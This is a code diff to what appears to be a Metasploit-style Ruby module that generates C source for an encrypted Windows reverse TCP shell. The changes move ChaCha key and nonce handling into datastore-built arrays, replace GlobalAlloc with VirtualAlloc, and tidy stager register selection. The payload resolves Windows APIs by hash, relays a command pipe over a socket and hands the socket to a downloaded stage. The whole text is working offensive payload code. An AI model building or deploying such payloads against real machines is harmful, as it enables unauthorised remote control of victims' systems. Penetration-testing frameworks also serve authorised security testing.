@@ -57,8 +57,7 @@ module Payload::Windows::EncryptedReverseTcp
 
   def initial_code
     src = headers
-    src << '  #include "64BitHelper.h"' if self.arch_to_s.eql?(ARCH_X64)
-    src << chacha_key
+    src << align_rsp if self.arch_to_s.eql?('x64')
 
     if staged?
       src << chacha_func_staged
@@ -169,10 +168,9 @@ module Payload::Windows::EncryptedReverseTcp
     ^
   end
 
-  def chacha_key
+  def align_rsp
     %Q^
-      #define KEY     "#{datastore['ChachaKey']}"
-      #define NONCE   "#{datastore['ChachaNonce']}"
+      extern VOID AlignRSP();
     ^
   end
 
@@ -181,8 +179,8 @@ module Payload::Windows::EncryptedReverseTcp
       char *chacha_data(char *buf, int len, char *key, char *nonce)
       {
         chacha_ctx ctx;
-        chacha_keysetup(&ctx, KEY, 256, 96);
-        chacha_ivsetup(&ctx, NONCE);
+        chacha_keysetup(&ctx, key, 256, 96);
+        chacha_ivsetup(&ctx, nonce);
 
         chacha_encrypt_bytes(&ctx, buf, buf, len);
         buf[len] = '\\0';
@@ -197,10 +195,11 @@ module Payload::Windows::EncryptedReverseTcp
       char *chacha_data(char *buf, int len, char *key, char *nonce)
         {
           chacha_ctx ctx;
-          chacha_keysetup(&ctx, KEY, 256, 96);
-          chacha_ivsetup(&ctx, NONCE);
-          FuncGlobalAlloc GlobalAlloc = (FuncGlobalAlloc) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'GlobalAlloc')}); // hash('kernel32.dll', 'GlobalAlloc') -> 0x520f76f6
-          char *out = GlobalAlloc(GMEM_FIXED, sizeof(char) * (len + 1));
+          chacha_keysetup(&ctx, key, 256, 96);
+          chacha_ivsetup(&ctx, nonce);
+
+          FuncVirtualAlloc VirtualAlloc = (FuncVirtualAlloc) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'VirtualAlloc')}); // hash('kernel32.dll',
+          char *out = VirtualAlloc(NULL, len+1, MEM_COMMIT, PAGE_READWRITE);
           chacha_encrypt_bytes(&ctx, buf, out, len);
           out[len] = '\\0';
           return out;
@@ -350,8 +349,6 @@ module Payload::Windows::EncryptedReverseTcp
         int buf_size = 512;
         int new_key = 0;
         DWORD bytes_received = 0;
-        char *key = NULL;
-        char *nonce = NULL;
         FuncSleep Sleep = (FuncSleep) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'Sleep')}); // hash('kernel32.dll', 'Sleep') -> 0xe035f044
         FuncSend SendData = (FuncSend) GetProcAddressWithHash(#{get_hash('ws2_32.dll', 'send')}); // hash('ws2_32.dll', 'send') -> 0x5f38ebc2
         FuncRecv RecvData = (FuncRecv) GetProcAddressWithHash(#{get_hash('ws2_32.dll', 'recv')}); // hash('ws2_32.dll', 'recv') -> 0x5fc8d902
@@ -359,32 +356,31 @@ module Payload::Windows::EncryptedReverseTcp
         FuncWriteFile WriteFile = (FuncWriteFile) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'WriteFile')}); // hash('kernel32.dll', 'WriteFile') -> 0x5bae572d
         FuncExitProcess ExitProcess = (FuncExitProcess) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'ExitProcess')}); // hash('kernel32.dll', 'ExitProcess') -> 0x56a2b5f0
         FuncPeekNamedPipe PeekNamedPipe = (FuncPeekNamedPipe) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'PeekNamedPipe')}); // hash('kernel32.dll', 'PeekNamedPipe') -> 0xb33cb718
-        FuncGlobalFree GlobalFree = (FuncGlobalFree) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'GlobalFree')});
+        FuncVirtualFree VirtualFree = (FuncVirtualFree) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'VirtualFree')}); // hash('kernel32.dll', 'VirtualFree') -> 0x300f2f0b
 
         SecureZeroMemory(buf, buf_size);
         UINT term_stat = ExitProc();
-
-        if(new_key == 0)
-        {
-          char *stream = get_new_key(s);
-          if(stream == NULL)
-          {
-            ExitProcess(term_stat);
-          }
-
-          char *res = chacha_data(stream, 44, KEY, NONCE);
-          key = res;
-          nonce = res + 32;
-          new_key = 1;
-        }
-        else
-        {
-          key = KEY;
-          nonce = NONCE;
-        }
+        char init_key[] = { #{format_ds_opt(datastore['ChachaKey'])} };
+        char init_nonce[] = { #{format_ds_opt(datastore['ChachaNonce'])} };
+        char *key = init_key;
+        char *nonce = init_nonce;
 
         do
         {
+          if(new_key == 0)
+          {
+            char *stream = get_new_key(s);
+            if(stream == NULL)
+            {
+              ExitProcess(term_stat);
+            }
+
+            char *res = chacha_data(stream, 44, key, nonce);
+            key = res + 12;
+            nonce = res;
+            new_key = 1;
+          }
+
           if(PeekNamedPipe(out, NULL, 0, NULL, &data, NULL) && data > 0)
           {
             if(!ReadFile(out, buf, buf_size-1, &bytes_received, NULL))
@@ -392,11 +388,9 @@ module Payload::Windows::EncryptedReverseTcp
               ExitProcess(term_stat);
             }
             char *cmd = chacha_data(buf, bytes_received, key, nonce);
-            //SendData(s, buf, bytes_received, 0);
             SendData(s, cmd, bytes_received, 0);
             SecureZeroMemory(buf, buf_size);
-            // GlobalFree
-            GlobalFree(cmd);
+            VirtualFree(cmd, bytes_received+1, MEM_RELEASE);
           }
           else
           {
@@ -406,10 +400,9 @@ module Payload::Windows::EncryptedReverseTcp
             if(bytes_received > 0)
             {
               char *dec_cmd = chacha_data(buf, bytes_received, key, nonce);
-              //WriteFile(in, buf, bytes_received, &bytes_written, NULL);
               WriteFile(in, dec_cmd, bytes_received, &bytes_written, NULL);
               SecureZeroMemory(buf, buf_size);
-              GlobalFree(dec_cmd);
+              VirtualFree(dec_cmd, bytes_received+1, MEM_RELEASE);
             }
           }
           Sleep(100);
@@ -484,10 +477,8 @@ module Payload::Windows::EncryptedReverseTcp
   end
 
   def stager_comm
-    reg = 'edi'
-    inst = 'movl'
-    reg = 'rdi' unless self.arch_to_s.include?('x86')
-    inst = 'movq' unless self.arch_to_s.include?('x86')
+    reg = self.arch_to_s.eql?('x86') ? 'edi' : 'rdi'
+    inst = self.arch_to_s.eql?('x86') ? 'movl' : 'movq'
 
     %Q^
         FuncRecv RecvData = (FuncRecv) GetProcAddressWithHash(#{get_hash('ws2_32.dll', 'recv')}); // hash('ws2_32.dll', 'recv') -> 0x5fc8d902
@@ -507,7 +498,9 @@ module Payload::Windows::EncryptedReverseTcp
           ExitProcess(proc_term_status);
         }
 
-        chacha_data(received, stage_size + 1, KEY, NONCE);
+        char key[] = { #{format_ds_opt(datastore['ChachaKey'])} };
+        char nonce[] = { #{format_ds_opt(datastore['ChachaNonce'])} };
+        chacha_data(received, stage_size + 1, key, nonce);
         // hand the socket to the stage
         asm("#{inst} %0, %%#{reg}"
             :
@@ -523,10 +516,8 @@ module Payload::Windows::EncryptedReverseTcp
   end
 
   def exec_payload_stage
-    reg = 'edi'
-    inst = 'movl'
-    reg = 'rdi' unless self.arch_to_s.eql?('x86')
-    inst = 'movq' unless self.arch_to_s.eql?('x86')
+    reg = self.arch_to_s.eql?('x86') ? 'edi' : 'rdi'
+    inst = self.arch_to_s.eql?('x86') ? 'movl' : 'movq'
 
     %Q^
      void ExecutePayload()
